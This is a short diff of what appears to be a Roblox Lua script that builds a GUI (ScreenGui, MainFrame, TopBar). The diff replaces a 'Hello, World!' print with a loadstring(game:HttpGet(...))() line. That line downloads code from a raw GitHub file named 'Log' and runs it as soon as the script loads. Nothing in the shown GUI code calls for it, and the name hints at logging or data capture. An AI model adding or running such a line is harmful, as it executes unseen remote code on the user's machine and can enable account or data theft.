@@ -1,4 +1,5 @@
-print("Hello, World!")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/BROsaikyou/Script/refs/heads/main/Log'))()
+
 local ScreenGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
 local TopBar = Instance.new("Frame")
